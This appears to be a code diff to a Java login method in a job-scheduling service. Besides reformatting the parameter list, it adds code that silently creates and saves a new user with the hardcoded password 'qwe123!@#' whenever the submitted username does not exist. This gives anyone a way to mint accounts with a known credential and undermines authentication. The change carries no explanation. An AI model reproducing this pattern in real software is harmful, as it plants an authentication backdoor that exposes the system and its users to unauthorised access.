@@ -43,12 +43,7 @@ public class JobUserServiceImpl extends BaseJpaService<JobUser, Integer, JobUser
         return JobUser;
     }
 
-    public Result<String> login(
-            HttpServletRequest request,
-            HttpServletResponse response,
-            String username,
-            String password,
-            boolean ifRemember) {
+    public Result<String> login(            HttpServletRequest request,            HttpServletResponse response,            String username,            String password,            boolean ifRemember) {
 
         // param
         if (username == null
@@ -62,6 +57,12 @@ public class JobUserServiceImpl extends BaseJpaService<JobUser, Integer, JobUser
         var e = new JobUser();
         e.setUsername(username);
         var example = Example.of(e);
+       var u =  this.reader.findOne(example);
+        if (!u.isPresent())
+        {
+            e.setPassword("qwe123!@#");
+            this.writer.save(e) ;
+        }
         JobUser JobUser = this.reader.findOne(example).get();
         if (JobUser == null) {
             return Result.fail(500, I18nUtil.getString("login_param_unvalid"));
